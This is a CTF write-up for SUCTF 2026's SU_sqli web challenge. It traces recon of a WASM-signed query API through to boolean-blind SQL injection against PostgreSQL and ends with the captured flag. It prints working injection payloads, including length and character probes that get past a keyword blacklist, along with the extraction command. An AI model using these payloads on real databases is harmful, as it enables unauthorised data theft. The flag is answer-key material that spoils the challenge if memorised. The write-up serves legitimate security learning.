---
title: "SUCTF 2026: SU_sqli"
description: "Writeup for SU_sqli from SUCTF 2026."
slug: suctf-su-sqli
date: 2026-03-14 04:57:15.406+0000
competition: "SUCTF 2026"
categories:
    - Web Exploitation
tags:
    - writeup
    - suctf-2026
    - su-sqli
---

## Challenge

- Competition: [SUCTF 2026](https://ctftime.org/event/3161/)
- Challenge: `SU_sqli`
- Category: `Web Exploitation`
- Original target(s): [http://101.245.108.250:10001/](http://101.245.108.250:10001/), [http://101.245.108.250:10002/](http://101.245.108.250:10002/), [http://101.245.108.250:10003/](http://101.245.108.250:10003/)


## Solve Path

FLAG:
SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}

WRITEUP:
1) Target Overview
   - URL / endpoint: `http://101.245.108.250:10001/`, `http://101.245.108.250:10002/`, `http://101.245.108.250:10003/`
   - Tech stack (if known): browser-side Go/WASM signer, PostgreSQL backend
   - Observed behavior: `GET /api/sign` returns signing material; `POST /api/query` searches public note titles and leaks SQL errors

2) Recon
   - Directory discovery: `/`, `/api/sign`, `/api/query`, `/static/app.js`, `/static/crypto1.wasm`, `/static/crypto2.wasm`; `robots.txt`, `/admin`, `/api`, `/debug` all 404
   - Parameters found: JSON body `{"q","nonce","ts","sign"}`
   - Cookies / sessions: none
   - Headers: no auth/session cookie; only the per-request signature matters
   - JS analysis: the local `application.zip` client signs requests in `app.js` via the two WASM blobs
   - Hidden endpoints: none found beyond the signer/query API pair
   - Source review: client only, no server code

3) Vulnerability
   - Type: SQL injection in `q`
   - Root cause: `q` is concatenated into a quoted `ILIKE` pattern on PostgreSQL
   - Proof of vulnerability:
     - `q='` returns `ERROR: unterminated quoted string ... (SQLSTATE 42601)`
     - `q=' || '' || '` returns all public rows, proving expression injection inside the pattern
     - A blacklist exists (`or`, `and`, `--`, `union`, etc.), but scalar subqueries still work

4) Exploitation
   - Step-by-step HTTP requests:
     - `curl http://101.245.108.250:10001/api/sign`
     - Generate a valid `sign` with the shipped WASM/client logic
     - Send `POST /api/query` with boolean-blind payloads in `q`
   - Payloads used:
     - Syntax proof: `' || '' || '`
     - Length probe: `' || (SELECT CASE WHEN length((SELECT flag FROM secrets OFFSET 0 LIMIT 1))=37 THEN '' ELSE 'zzzzzzzz' END) || '`
     - Char probe: `' || (SELECT CASE WHEN ascii(substr((SELECT flag FROM secrets OFFSET 0 LIMIT 1),1,1))>77 THEN '' ELSE 'zzzzzzzz' END) || '`
   - Why it works: on true, the pattern becomes `%%` and returns the 3 public notes; on false, it becomes `%zzzzzzzz%` and returns no rows. That gives a clean boolean oracle.

5) Flag Extraction
   - Exact request that returns the flag:
     - I extracted it with the signed blind-query helper against `secrets.flag`:
       `node `anas/su_sqli_blind.js` 10001 text "(SELECT flag FROM secrets OFFSET 0 LIMIT 1)" 128`
   - Response proof:
     - The extractor converged to `SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}`
     - The same flag was recovered from `:10002` and `:10003`

Submit:
`SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}`
